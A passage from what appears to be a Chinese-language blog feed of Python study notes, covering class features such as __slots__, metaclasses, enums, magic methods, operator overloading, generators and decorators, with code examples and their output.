class="line"><span class="class"><span class="keyword">class</span> <span class="title">CLinux</span><span class="params">(CLanguage)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">say</span><span class="params">(self)</span>:</span></span><br><span class="line">        print(<span class="string">"调用的是 CLinux 类的say方法"</span>)</span><br><span class="line">a = WhoSay()</span><br><span class="line"><span class="comment"># 调用 CLanguage 类的 say() 方法</span></span><br><span class="line">a.say(CLanguage())</span><br><span class="line"><span class="comment"># 调用 CPython 类的 say() 方法</span></span><br><span class="line">a.say(CPython())</span><br><span class="line"><span class="comment"># 调用 CLinux 类的 say() 方法</span></span><br><span class="line">a.say(CLinux())</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">调用的是 Clanguage 类的say方法</span><br><span class="line">调用的是 CPython 类的say方法</span><br><span class="line">调用的是 CLinux 类的say方法</span><br></pre></td></tr></table></figure>

<h3 id="11、-slot"><a href="#11、-slot" class="headerlink" title="11、__slot__"></a>11、<code>__slot__</code></h3><ul>
<li>为单个实例对象添加方法，不会影响该类的其它实例对象；而如果为类动态地添加方法，则所有的实例对象都可以使用</li>
<li>Python 提供了 <code>__slots__</code> 属性，通过它可以避免用户频繁的给实例对象动态地添加属性或方法</li>
<li><code>__slots__</code> 只能限制为实例对象动态添加属性和方法，而无法限制动态地为类添加属性和方法, 限制的是其方法名，并不限制参数的个数, 并且只对当前所在的类起限制作用</li>
<li>注意，如果为子类也设置有 <code>__slots__</code> 属性，那么子类实例对象允许动态添加的属性和方法，是子类中 <code>__slots__</code>属性和父类 <code>__slots__</code> 属性的和</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 省内存的</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">animal</span>:</span></span><br><span class="line">    __slots__ = (<span class="string">"name"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, name)</span>:</span></span><br><span class="line">        self.name = name</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">say</span><span class="params">(self)</span>:</span></span><br><span class="line">        print(<span class="string">"animal = &#123;&#125;"</span>.format(self.name))</span><br><span class="line">    </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">people</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, name)</span>:</span></span><br><span class="line">        self.name = name</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">say</span><span class="params">(self)</span>:</span></span><br><span class="line">        print(<span class="string">"people = &#123;&#125;"</span>.format(self.name))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">a = animal(<span class="string">"1"</span>)</span><br><span class="line">p = people(<span class="string">"1"</span>)</span><br><span class="line">print(a.__sizeof__())</span><br><span class="line">print(p.__sizeof__())</span><br><span class="line">print(animal.__dict__)</span><br><span class="line">print(people.__dict__)</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line"><span class="number">24</span></span><br><span class="line"><span class="number">32</span></span><br><span class="line">&#123;<span class="string">'__module__'</span>: <span class="string">'__main__'</span>, <span class="string">'__slots__'</span>: <span class="string">'name'</span>, <span class="string">'__init__'</span>: &lt;function animal.__init__ at <span class="number">0x000001C1AD499F70</span>&gt;, <span class="string">'say'</span>: &lt;function animal.say at <span class="number">0x000001C1AD4AA040</span>&gt;, <span class="string">'name'</span>: &lt;member <span class="string">'name'</span> of <span class="string">'animal'</span> objects&gt;, <span class="string">'__doc__'</span>: <span class="literal">None</span>&#125;</span><br><span class="line">&#123;<span class="string">'__module__'</span>: <span class="string">'__main__'</span>, <span class="string">'__init__'</span>: &lt;function people.__init__ at <span class="number">0x000001C1AD4AA0D0</span>&gt;, <span class="string">'say'</span>: &lt;function people.say at <span class="number">0x000001C1AD4AA160</span>&gt;, <span class="string">'__dict__'</span>: &lt;attribute <span class="string">'__dict__'</span> of <span class="string">'people'</span> objects&gt;, <span class="string">'__weakref__'</span>: &lt;attribute <span class="string">'__weakref__'</span> of <span class="string">'people'</span> objects&gt;, <span class="string">'__doc__'</span>: <span class="literal">None</span>&#125;</span><br></pre></td></tr></table></figure>

<h3 id="12-、type创建类"><a href="#12-、type创建类" class="headerlink" title="12 、type创建类"></a>12 、type创建类</h3><ul>
<li><p><code>type(name, bases, dict)</code> 其中 name 表示类的名称；bases 表示一个元组，其中存储的是该类的父类；dict 表示一个字典，用于表示类内定义的属性或者方法</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 定义一个实例方法</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">say</span><span class="params">(self)</span>:</span></span><br><span class="line">    print(<span class="string">"Python！"</span>)</span><br><span class="line"><span class="comment"># 使用 type() 函数创建类</span></span><br><span class="line">CLanguage = type(<span class="string">"CLanguage"</span>,(object,),dict(say = say, name = <span class="string">"C语言"</span>))</span><br><span class="line"><span class="comment"># 创建一个 CLanguage 实例对象</span></span><br><span class="line">clangs = CLanguage()</span><br><span class="line"><span class="comment"># 调用 say() 方法和 name 属性</span></span><br><span class="line">clangs.say()</span><br><span class="line">print(clangs.name)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ict 字典中添加的是方法还是属性？</span></span><br><span class="line"><span class="comment"># 如果该键值对中，值为普通变量（如 "C语言"），则表示为类添加了一个类属性</span></span><br><span class="line"><span class="comment"># 如果值为外部定义的函数（如 say() ），则表示为类添加了一个实例方法</span></span><br></pre></td></tr></table></figure>


</li>
</ul>
<h3 id="13-、MetaClass元类"><a href="#13-、MetaClass元类" class="headerlink" title="13 、MetaClass元类"></a>13 、MetaClass元类</h3><ul>
<li>元类本质上也是一个类，但是和普通类的用法不同，可以对类内部的定义(类属性和方法)进行动态修改，可以修改类创建的流程</li>
<li>元类和类的关系可以等同于类和实例的关系</li>
<li>多用于创建API，几乎不会用到</li>
<li>所有python自定义类，都是type类的实例</li>
<li>用户自定义类，是type类的<code>__call__</code>运算符重载</li>
<li>metaclass 仅仅是给小部分 Python 开发者，在开发框架层面的 Python 库时使用的。而在应用层，metaclass 往往不是很好的选择(尽量不要使用)</li>
</ul>
<h3 id="14、枚举类"><a href="#14、枚举类" class="headerlink" title="14、枚举类"></a>14、枚举类</h3><ul>
<li><p>和普通类用法不同，枚举类不能用来实例化对象</p>
</li>
<li><p>枚举类成员之间不能比较大小，但可以<code>==</code>和<code>is</code>比较是否相等</p>
</li>
<li><p>枚举类各个成员的值，不能在类的外部做任何修改</p>
</li>
<li><p>枚举类提供了一个<code>__members__</code>属性，该属性包含枚举类所有成员的字典，通过遍历该属性，可以访问枚举类的各个成员</p>
</li>
<li><p>枚举类的各个成员必须保证<code>name</code>互不相同，<code>value</code>可以相同</p>
</li>
<li><p>如果要保证<code>value</code>也不同，可以使用<code>@unique装饰器</code>当枚举类中出现相同值的成员时，程序会报 ValueError 错误</p>
</li>
<li><p><code>除了通过继承 Enum 类的方法创建枚举类，还可以使用 Enum() 函数创建枚举类</code>,Enum() 函数可接受 2 个参数，第一个用于指定枚举类的类名，第二个参数用于指定枚举类中的多个成员</p>
</li>
</ul>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> enum <span class="keyword">import</span> Enum, unique</span><br><span class="line"></span><br><span class="line"><span class="meta">@unique</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">animal</span><span class="params">(Enum)</span>:</span></span><br><span class="line">    a = <span class="number">1</span></span><br><span class="line">    b = <span class="number">2</span></span><br><span class="line">    c = <span class="number">3</span></span><br><span class="line"></span><br><span class="line">print(animal.a)</span><br><span class="line">print(animal[<span class="string">'a'</span>])</span><br><span class="line">print(animal(<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">print(animal.a.name)</span><br><span class="line">print(animal.a.value)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> animal:</span><br><span class="line">    print(i)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> name, member <span class="keyword">in</span> animal.__members__.items():</span><br><span class="line">    print(name,<span class="string">"-&gt;"</span>,member)</span><br><span class="line">    </span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">animal.a</span><br><span class="line">animal.a</span><br><span class="line">animal.a</span><br><span class="line">a</span><br><span class="line"><span class="number">1</span></span><br><span class="line">animal.a</span><br><span class="line">animal.b</span><br><span class="line">animal.c</span><br><span class="line">a -&gt; animal.a</span><br><span class="line">b -&gt; animal.b</span><br><span class="line">c -&gt; animal.c</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>奇淫</tag>
        <tag>python类和对象</tag>
      </tags>
  </entry>
  <entry>
    <title>python自我补充6</title>
    <url>/2020/03/11/blog_formal/%E5%BC%80%E5%8F%91/python/%E5%A5%87%E6%B7%AB%E6%8A%80%E5%B7%A76/</url>
    <content><![CDATA[<h1 id="python-奇淫6"><a href="#python-奇淫6" class="headerlink" title="python 奇淫6"></a>python 奇淫6</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>这个系列主要收录python的一些不常用知识点</p>
<a id="more"></a>

<h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h3 id="1、-new"><a href="#1、-new" class="headerlink" title="1、__new__()"></a>1、<code>__new__()</code></h3><ul>
<li><p>负责创建类实例的静态方法，无需使用<code>staticmethed</code>装饰器修饰，此方法先于<code>__init__</code>初始化方法调用</p>
</li>
<li><p>此方法会返回一个类的实例，但有时也会返回其他类的实例，此时会跳过对 <code>__init__()</code>方法的调用</p>
</li>
<li><p>什么时候用这个方法? 当<code>__init__()</code>不够用的时候</p>
</li>
</ul>
<h3 id="2、-repr-显示属性"><a href="#2、-repr-显示属性" class="headerlink" title="2、__repr__()显示属性"></a>2、<code>__repr__()</code>显示属性</h3><ul>
<li>默认情况下，<code>类名+object at+内存地址</code></li>
<li>重写此方法，可以自定义输出一些其他信息</li>
<li>object类中包含此方法，所以python中所有的类都包含这个方法(所有的类都直接或间接继承object类)</li>
<li>相当于自我介绍的方法</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">animal</span><span class="params">()</span>:</span></span><br><span class="line">    a = <span class="number">1</span></span><br><span class="line">    b = <span class="number">2</span></span><br><span class="line">    c = <span class="number">3</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__repr__</span><span class="params">(self)</span>:</span></span><br><span class="line">        print(<span class="string">"hello world"</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"1111"</span></span><br><span class="line"></span><br><span class="line">print(animal())</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">hello world</span><br><span class="line"><span class="number">1111</span></span><br></pre></td></tr></table></figure>

<h3 id="3、-del"><a href="#3、-del" class="headerlink" title="3、__del__()"></a>3、<code>__del__()</code></h3><ul>
<li>计数为0的时候回自动调用此方法，进行释放</li>
<li>重写子类的<code>__del__()</code>方法（父类为非 object 的类），则必须显式调用父类的<code>__del__()</code>方法，才能保证在回收子类对象时，其占用的资源（可能包含继承自父类的部分资源）能被彻底释放</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CLanguage</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__del__</span><span class="params">(self)</span>:</span></span><br><span class="line">        print(<span class="string">"调用父类 __del__() 方法"</span>)</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cl</span><span class="params">(CLanguage)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__del__</span><span class="params">(self)</span>:</span></span><br><span class="line">        print(<span class="string">"调用子类 __del__() 方法"</span>)</span><br><span class="line">c = cl()</span><br><span class="line"><span class="keyword">del</span> c</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">调用子类 __del__() 方法</span><br></pre></td></tr></table></figure>

<h3 id="4、-dir"><a href="#4、-dir" class="headerlink" title="4、__dir__()"></a>4、<code>__dir__()</code></h3><ul>
<li>使用 <strong>dir</strong>() 方法和 dir() 函数输出的数据是相同,顺序不同而已</li>
</ul>
<h3 id="5、-dict"><a href="#5、-dict" class="headerlink" title="5、__dict__()"></a>5、<code>__dict__()</code></h3><ul>
<li><p>类名直接调用<code>__dict__</code>，会输出该由类中所有类属性组成的字典</p>
</li>
<li><p>使用类的实例对象调用<code>__dict__</code>，会输出由类中所有实例属性组成的字典</p>
</li>
<li><p>对于具有继承关系的父类和子类来说，父类有自己的 <code>__dict__</code>，同样子类也有自己的 <code>__dict__</code>，不会包含父类的 <code>__dict__</code></p>
</li>
<li><p>借助由类实例对象调用 <code>__dict__</code>属性获取的字典，可以使用字典的方式对其中实例属性的值进行修改,<code>xxx.__dict__[&#39;name&#39;] = &quot;xxxx&quot;</code>, 无法通过类似的方式修改类变量的值</p>
</li>
</ul>
<h3 id="6、setattr-、getattr-、hasattr"><a href="#6、setattr-、getattr-、hasattr" class="headerlink" title="6、setattr()、getattr()、hasattr()"></a>6、setattr()、getattr()、hasattr()</h3><ul>
<li><code>hasattr()</code>函数<ul>
<li>基本用法, <code>hasattr(obj, name)</code>其中 obj 指的是某个类的实例对象，name 表示指定的属性名或方法名。同时，该函数会将判断的结果（True 或者 False）作为返回值</li>
<li>无论是属性名还是方法名，都在 hasattr() 函数的匹配范围内。只能通过该函数判断实例对象是否包含该名称的属性或方法，不能精确判断，该名称代表的是属性还是方法</li>
</ul>
</li>
<li><code>getattr()</code>函数<ul>
<li><code>getattr(obj, name[, default])</code>其中，obj 表示指定的类实例对象，name 表示指定的属性名，而 default 是可选参数，用于设定该函数的默认返回值，即当函数查找失败时，如果不指定 default 参数，则程序将直接报 AttributeError 错误，反之该函数将返回 default 指定的值</li>
<li>对于类中已有的属性，getattr() 会返回它们的值，而如果该名称为方法名，则返回该方法的状态信息；反之，如果该属性不为类对象所有，要么返回默认的参数，要么程序报 AttributeError 错误</li>
</ul>
</li>
<li><code>setattr()</code>函数(修改类实例对象中的属性值&amp;&amp;为实例对象动态添加属性或者方法)<ul>
<li>基本用法<code>setattr(obj, name, value)</code></li>
<li>利用 setattr() 函数，可以将类属性修改为一个类方法，也可以将类方法修改成一个类属性</li>
<li>使用 setattr() 函数对实例对象中执行名称的属性或方法进行修改时，如果该名称查找失败，Python 解释器不会报错，而是会给该实例对象动态添加一个指定名称的属性或方法</li>
</ul>
</li>
</ul>
<h3 id="7、issubclass和isinstance"><a href="#7、issubclass和isinstance" class="headerlink" title="7、issubclass和isinstance"></a>7、issubclass和isinstance</h3><ul>
<li>issubclass(cls, class_or_tuple)：检查 cls 是否为后一个类或元组包含的多个类中任意类的子类</li>
<li>isinstance(obj, class_or_tuple)：检查 obj 是否为后一个类或元组包含的多个类中任意类的对象</li>
<li>Python 为所有类都提供了一个<code>__bases__</code> 属性，通过该属性可以查看该类的所有直接父类，该属性返回所有直接父类组成的元组</li>
<li>Python 还为所有类都提供了一个 <code>__subclasses__()</code> 方法，通过该方法可以查看该类的所有直接子类，该方法返回该类的所有子类组成的列表</li>
</ul>
<h3 id="8、-call"><a href="#8、-call" class="headerlink" title="8、__call__"></a>8、<code>__call__</code></h3><ul>
<li>类似于在类中重载 () 运算符，使得类实例对象可以像调用普通函数那样，以“对象名()”的形式使用</li>
<li>Python 中，凡是可以将 () 直接应用到自身并执行，都称为可调用对象。可调用对象包括自定义的函数、Python 内置函数以及类实例对象(重写call)</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">"hello"</span>)</span><br><span class="line"></span><br><span class="line">hello()</span><br><span class="line">hello.__call__()</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">a</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, aaaa)</span>:</span></span><br><span class="line">        self.aaaa = aaaa</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">xxx</span><span class="params">(self)</span>:</span></span><br><span class="line">        print(<span class="string">"xxxx"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__call__</span><span class="params">(self)</span>:</span></span><br><span class="line">        print(<span class="string">"__call__"</span>)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">aa = a(<span class="number">1</span>)</span><br><span class="line">aa()</span><br><span class="line">aa.__call__()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 弥补 hasattr() 函数的短板</span></span><br><span class="line">print(hasattr(aa.aaaa, <span class="string">"__call__"</span>))</span><br><span class="line">print(hasattr(aa.xxx, <span class="string">"__call__"</span>))</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">hello</span><br><span class="line">hello</span><br><span class="line">__call__</span><br><span class="line">__call__</span><br><span class="line"><span class="literal">False</span></span><br><span class="line"><span class="literal">True</span></span><br></pre></td></tr></table></figure>

<h3 id="9、重载"><a href="#9、重载" class="headerlink" title="9、重载"></a>9、重载</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyClass</span>:</span>  <span class="comment"># 自定义一个类</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, name , age)</span>:</span>  <span class="comment"># 定义该类的初始化函数</span></span><br><span class="line">        self.name = name  <span class="comment"># 将传入的参数值赋值给成员交量</span></span><br><span class="line">        self.age = age</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__str__</span><span class="params">(self)</span>:</span>  <span class="comment"># 用于将值转化为字符串形式，等同于 str(obj)</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">"name:"</span>+self.name+<span class="string">";age:"</span>+str(self.age)</span><br><span class="line">   </span><br><span class="line">    __repr__ = __str__  <span class="comment"># 转化为供解释器读取的形式</span></span><br><span class="line">   </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__lt__</span><span class="params">(self, record)</span>:</span>  <span class="comment"># 重载 self&lt;record 运算符</span></span><br><span class="line">        <span class="keyword">if</span> self.age &lt; record.age:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">   </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__add__</span><span class="params">(self, record)</span>:</span>  <span class="comment"># 重载 + 号运算符</span></span><br><span class="line">        <span class="keyword">return</span> MyClass(self.name, self.age+record.age)</span><br><span class="line">myc = MyClass(<span class="string">"Anna"</span>, <span class="number">42</span>)  <span class="comment"># 实例化一个对象 Anna，并为其初始化</span></span><br><span class="line">mycl = MyClass(<span class="string">"Gary"</span>, <span class="number">23</span>)  <span class="comment"># 实例化一个对象 Gary，并为其初始化</span></span><br><span class="line">print(repr(myc))  <span class="comment"># 格式化对象 myc，</span></span><br><span class="line">print(myc)  <span class="comment"># 解释器读取对象 myc，调用 repr</span></span><br><span class="line"><span class="keyword">print</span> (str (myc))  <span class="comment"># 格式化对象 myc ，输出"name:Anna;age:42"</span></span><br><span class="line">print(myc &lt; mycl)  <span class="comment"># 比较 myc&lt;mycl 的结果，输出 False</span></span><br><span class="line"><span class="keyword">print</span> (myc+mycl)  <span class="comment"># 进行两个 MyClass 对象的相加运算，输出 "name:Anna;age:65"</span></span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">name:Anna;age:<span class="number">42</span></span><br><span class="line">name:Anna;age:<span class="number">42</span></span><br><span class="line">name:Anna;age:<span class="number">42</span></span><br><span class="line"><span class="literal">False</span></span><br><span class="line">name:Anna;age:<span class="number">65</span></span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>重载运算符</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td><code>__new__</code></td>
<td>创建类，在<code>__init__</code> 之前创建对象</td>
</tr>
<tr>
<td><code>__init__</code></td>
<td>类的构造函数，其功能是创建类对象时做初始化工作。</td>
</tr>
<tr>
<td><code>__del__</code></td>
<td>析构函数，其功能是销毁对象时进行回收资源的操作</td>
</tr>
<tr>
<td><code>__add__</code></td>
<td>加法运算符 +，当类对象 X 做例如 X+Y 或者 X+=Y 等操作，内部会调用此方法。但如果类中对 <code>__iadd__</code> 方法进行了重载，则类对象 X 在做 X+=Y 类似操作时，会优先选择调用 <code>__iadd__</code> 方法。</td>
</tr>
<tr>
<td><code>__radd__</code></td>
<td>当类对象 X 做类似 Y+X 的运算时，会调用此方法。</td>
</tr>
<tr>
<td><code>__iadd__</code></td>
<td>重载 += 运算符，也就是说，当类对象 X 做类似 X+=Y 的操作时，会调用此方法。</td>
</tr>
<tr>
<td><code>__or__</code></td>
<td>“或”运算符 |，如果没有重载 <code>__ior__</code>，则在类似 X|Y、X|=Y 这样的语句中，“或”符号生效</td>
</tr>
<tr>
<td><code>__repr__</code>，<code>__str__</code></td>
<td>格式转换方法，分别对应函数 repr(X)、str(X)</td>
</tr>
<tr>
<td><code>__call__</code></td>
<td>函数调用，类似于 X(<code>*args</code>, <code>**kwargs</code>) 语句</td>
</tr>
<tr>
<td><code>__getattr__</code></td>
<td>点号运算，用来获取类属性</td>
</tr>
<tr>
<td><code>__setattr__</code></td>
<td>属性赋值语句，类似于 X.any=value</td>
</tr>
<tr>
<td><code>__delattr__</code></td>
<td>删除属性，类似于 del X.any</td>
</tr>
<tr>
<td><code>__getattribute__</code></td>
<td>获取属性，类似于 X.any</td>
</tr>
<tr>
<td><code>__getitem__</code></td>
<td>索引运算，类似于 X[key]，X[i:j]</td>
</tr>
<tr>
<td><code>__setitem__</code></td>
<td>索引赋值语句，类似于 X[key], X[i:j]=sequence</td>
</tr>
<tr>
<td><code>__delitem__</code></td>
<td>索引和分片删除</td>
</tr>
<tr>
<td><code>__get__</code>, <code>__set__</code>, <code>__delete__</code></td>
<td>描述符属性，类似于 X.attr，X.attr=value，del X.attr</td>
</tr>
<tr>
<td><code>__len__</code></td>
<td>计算长度，类似于 len(X)</td>
</tr>
<tr>
<td><code>__lt__</code>，<code>__gt__</code>，<code>__le__</code>，<code>__ge__</code>，<code>__eq__</code>，<code>__ne__</code></td>
<td>比较，分别对应于 &lt;、&gt;、&lt;=、&gt;=、=、!= 运算符。</td>
</tr>
<tr>
<td><code>__iter__</code>，<code>__next__</code></td>
<td>迭代环境下，生成迭代器与取下一条，类似于 I=iter(X) 和 next()</td>
</tr>
<tr>
<td><code>__contains__</code></td>
<td>成员关系测试，类似于 item in X</td>
</tr>
<tr>
<td><code>__index__</code></td>
<td>整数值，类似于 hex(X)，bin(X)，oct(X)</td>
</tr>
<tr>
<td><code>__enter__</code>，<code>__exit__</code></td>
<td>在对类对象执行类似 with obj as var 的操作之前，会先调用 <code>__enter__</code> 方法，其结果会传给 var；在最终结束该操作之前，会调用 <code>__exit__</code> 方法（常用于做一些清理、扫尾的工作）</td>
</tr>
</tbody></table>
<h3 id="10、迭代器-amp-amp-生成器"><a href="#10、迭代器-amp-amp-生成器" class="headerlink" title="10、迭代器&amp;&amp;生成器"></a>10、迭代器&amp;&amp;生成器</h3><ul>
<li><p>自定义一个迭代器。需要2个方法</p>
<ul>
<li><code>__next__</code>(self)：返回容器的下一个元素</li>
<li><code>__iter__</code>(self)：该方法返回一个迭代器（iterator）</li>
<li>内置的 iter() 函数也会返回一个迭代器 <code>iter(obj[, sentinel])</code></li>
</ul>
</li>
<li><p>生成器,省空间</p>
<ul>
<li>定义一个以 yield 关键字标识返回值的函数</li>
<li>调用刚刚创建的函数，即可创建一个生成器</li>
</ul>
</li>
<li><p>生成器高级用法</p>
<ul>
<li><p><code>send()</code>函数： 通过调用 <code>next()</code> 或者<code>__next__()</code>方法，可以实现从外界控制生成器的执行。通过 send() 方法，可以向生成器中传值,也就是yield那里的值，<code>send(None)</code> == <code>next()</code>效果一样，但是推荐用next方法</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">foo</span><span class="params">()</span>:</span></span><br><span class="line">    bar_a = <span class="keyword">yield</span> <span class="string">"hello"</span></span><br><span class="line">    bar_b = <span class="keyword">yield</span> bar_a</span><br><span class="line">    <span class="keyword">yield</span> bar_b</span><br><span class="line">f = foo()</span><br><span class="line">print(f.send(<span class="literal">None</span>))</span><br><span class="line">print(f.send(<span class="string">"caixin"</span>))</span><br><span class="line">print(f.send(<span class="string">"caixin0623"</span>))</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>close()</code>函数：程序在生成器函数中遇到 yield 语句暂停运行时，调用<code>close()</code>方法，阻止生成器函数继续执行，抛出<code>GeneratorExit</code>异常</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">foo</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">yield</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">except</span> GeneratorExit:</span><br><span class="line">        print(<span class="string">'捕获到 GeneratorExit'</span>)</span><br><span class="line">f = foo()</span><br><span class="line">print(next(f))</span><br><span class="line">f.close()</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line"><span class="number">1</span></span><br><span class="line">捕获到 GeneratorExit</span><br><span class="line"></span><br><span class="line"><span class="comment"># 通过捕获 GeneratorExit 异常，可以继续执行生成器函数中剩余的代码，但是这部分代码中不能再包含 yield 语句，否则程序会抛出 RuntimeError 异常</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">foo</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">yield</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">except</span> GeneratorExit:</span><br><span class="line">        print(<span class="string">'捕获到 GeneratorExit'</span>)</span><br><span class="line">        <span class="keyword">yield</span> <span class="number">2</span> <span class="comment">#抛出 RuntimeError 异常</span></span><br><span class="line">f = foo()</span><br><span class="line">print(next(f))</span><br><span class="line">f.close()</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">"d:/E/myblog/python/code1.py"</span>, line <span class="number">11</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    f.close()</span><br><span class="line">RuntimeError: generator ignored GeneratorExit</span><br><span class="line">    </span><br><span class="line"><span class="comment"># 生成器函数一旦使用 close() 函数停止运行，后续将无法再调用 next() 函数或者 __next__() 方法启动执行，否则会抛出 StopIteration 异常</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">foo</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">yield</span> <span class="string">"c.biancheng.net"</span></span><br><span class="line">    print(<span class="string">"生成器停止执行"</span>)</span><br><span class="line">f = foo()</span><br><span class="line">print(next(f)) <span class="comment">#输出 "c.biancheng.net"</span></span><br><span class="line">f.close()</span><br><span class="line">next(f) <span class="comment">#原本应输出"生成器停止执行"</span></span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">c.biancheng.net</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">"d:/E/myblog/python/code1.py"</span>, line <span class="number">9</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    next(f) <span class="comment">#原本应输出"生成器停止执行"</span></span><br><span class="line">StopIteration</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>throw()</code>函数: 在生成器函数执行暂停处，抛出一个指定的异常，之后程序会继续执行生成器函数中后续的代码，直到遇到下一个 yield 语句。注意的是，如果到剩余代码执行完毕没有遇到下一个 yield 语句，则程序会抛出 StopIteration 异常</p>
</li>
</ul>
</li>
</ul>
<h3 id="11、函数装饰器"><a href="#11、函数装饰器" class="headerlink" title="11、函数装饰器"></a>11、函数装饰器</h3><ul>
<li><p>函数装饰器，就是通过装饰器函数，在不修改原函数的前提下，来对函数的功能进行合理的扩充</p>
</li>
<li><p>带参数的函数装饰器，<code>*args **kwargs</code>表示接受任意数量和类型的参数`</p>
</li>
<li><p>函数装饰器可以嵌套</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@funA</span></span><br><span class="line"><span class="meta">@funB</span></span><br><span class="line"><span class="meta">@funC</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fun</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment">#...</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 相当于</span></span><br><span class="line">fun = funA(funB(funC(fun)))</span><br></pre></td></tr></table></figure>
</li>
<li><p>应用场景</p>
<ul>
<li>身份认证</li>
<li>日志记录</li>
<li>输入合理性检查</li>
<li>缓存装饰器</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>奇淫</tag>
        <tag>python类的特殊成员(属性&amp;方法)</tag>
      </tags>
  </entry>
  <entry>
    <title>正则表达式学习笔记</title>
